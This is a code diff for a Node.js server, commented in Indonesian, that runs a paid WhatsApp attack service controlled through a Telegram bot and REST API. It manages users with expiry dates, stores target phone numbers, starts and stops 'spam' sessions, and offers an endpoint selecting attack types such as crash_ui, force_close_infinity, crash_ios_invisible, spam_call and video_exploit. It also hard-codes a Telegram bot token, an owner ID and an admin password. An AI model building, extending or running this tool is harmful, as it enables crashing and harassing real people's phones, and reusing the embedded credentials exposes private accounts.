@@ -1,19 +1,24 @@
 const express = require('express');
+const cors = require('cors');
 const TelegramBot = require('node-telegram-bot-api');
 const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
 const fs = require('fs');
 const crypto = require('crypto');
 const QRCode = require('qrcode');
+
 const app = express();
+
+// ===== CORS (biar APK bisa akses dari file://) =====
+app.use(cors());
 app.use(express.json());
 app.use(express.static('public'));
 
-// ========== KONFIGURASI ==========
+// ===== KONFIGURASI =====
 const BOT_TOKEN = '8929432221:AAG3K8a6THua8Qf33mNEJHpc3iv_7W0tZtc';
 const OWNER_ID = '8718615350';
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
-// ========== DATA USER ==========
+// ===== DATA USER =====
 const DATA_FILE = './users.json';
 const SESSIONS_FILE = './sessions.json';
 let users = {};
@@ -58,7 +63,7 @@ function saveSessions() {
 loadUsers();
 loadSessions();
 
-// ========== HARCODE ADMIN ACUNN ==========
+// ===== HARCODE ADMIN ACUNN (NO EXPIRED) =====
 users['Acunn'] = {
     password: 'Kontol980',
     role: 'admin',
@@ -86,6 +91,7 @@ function isExpired(user) {
 }
 
 // ========== TELEGRAM BOT ==========
+// ===== OWNER ONLY =====
 bot.onText(/\/adduser (.+) (.+) (.+) (.+)/, (msg, match) => {
     if (msg.chat.id.toString() !== OWNER_ID) return bot.sendMessage(msg.chat.id, '❌ Lu bukan owner, anj!');
     const username = match[1], password = match[2], role = match[3].toLowerCase(), expired = match[4];
@@ -128,6 +134,7 @@ bot.onText(/\/setexpired (.+) (.+)/, (msg, match) => {
     bot.sendMessage(msg.chat.id, `✅ User ${username} expired diubah jadi ${expired}`);
 });
 
+// ===== UMUM =====
 bot.onText(/\/login (.+) (.+)/, (msg, match) => {
     const username = match[1], password = match[2];
     if (!users[username] || users[username].password !== password)
@@ -460,19 +467,25 @@ function stopSpamForUser(username) {
 }
 
 // ========== REST API ==========
+// ===== LOGIN (POST) =====
 app.post('/api/login', (req, res) => {
     const { username, password } = req.body;
-    if (!username || !password) return res.status(400).json({ error: 'Username dan password wajib' });
-    if (!users[username] || users[username].password !== password)
+    if (!username || !password) {
+        return res.status(400).json({ error: 'Username dan password wajib' });
+    }
+    if (!users[username] || users[username].password !== password) {
         return res.status(401).json({ error: 'Username atau password salah' });
-    if (isExpired(users[username]))
+    }
+    if (isExpired(users[username])) {
         return res.status(401).json({ error: 'User expired!' });
+    }
     const token = generateToken();
     sessions[token] = username;
     saveSessions();
     res.json({ token, username, role: users[username].role });
 });
 
+// ===== MIDDLEWARE AUTH =====
 function auth(req, res, next) {
     const token = req.headers['x-token'] || req.query.token;
     loadSessions();
@@ -490,6 +503,7 @@ function auth(req, res, next) {
 }
 
 // ========== REST API ==========
+// ===== STATUS =====
 app.get('/api/status', auth, (req, res) => {
     const user = users[req.username];
     res.json({
@@ -500,16 +514,19 @@ app.get('/api/status', auth, (req, res) => {
     });
 });
 
+// ===== START SPAM =====
 app.post('/api/start', auth, async (req, res) => {
     await startWASession(req.username);
     res.json({ message: 'Session started' });
 });
 
+// ===== STOP SPAM =====
 app.post('/api/stop', auth, (req, res) => {
     stopSpamForUser(req.username);
     res.json({ message: 'Spam stopped' });
 });
 
+// ===== TAMBAH TARGET =====
 app.post('/api/targets', auth, (req, res) => {
     const { number, role } = req.body;
     if (!number || !role) return res.status(400).json({ error: 'Missing fields' });
@@ -521,6 +538,7 @@ app.post('/api/targets', auth, (req, res) => {
     res.json({ success: true });
 });
 
+// ===== HAPUS TARGET =====
 app.delete('/api/targets', auth, (req, res) => {
     const { number, role } = req.body;
     const user = users[req.username];
@@ -534,7 +552,7 @@ app.delete('/api/targets', auth, (req, res) => {
     res.json({ success: true });
 });
 
-// ===== QR ENDPOINT (GAMBAR) =====
+// ===== QR (GAMBAR) =====
 app.get('/api/qr', auth, async (req, res) => {
     const user = users[req.username];
     if (!user.qr) return res.json({ qr: null });
@@ -546,7 +564,7 @@ app.get('/api/qr', auth, async (req, res) => {
     }
 });
 
-// ===== PAIRING ENDPOINT =====
+// ===== PAIRING =====
 app.post('/api/pair', auth, async (req, res) => {
     const { phone } = req.body;
     if (!phone || phone.length < 10) return res.status(400).json({ error: 'Nomor tidak valid' });
@@ -559,6 +577,7 @@ app.post('/api/pair', auth, async (req, res) => {
     }
 });
 
+// ===== SET ATTACK =====
 app.post('/api/setattack', auth, (req, res) => {
     const { type } = req.body;
     const validTypes = ['crash_ui','delay_invisible','crash_ios_invisible','force_close_1msg','force_close_invisible','force_close_ios_invisible','spam_call','delay_hard_invisible','blank_andro','force_close_infinity','video_exploit','cyclone'];
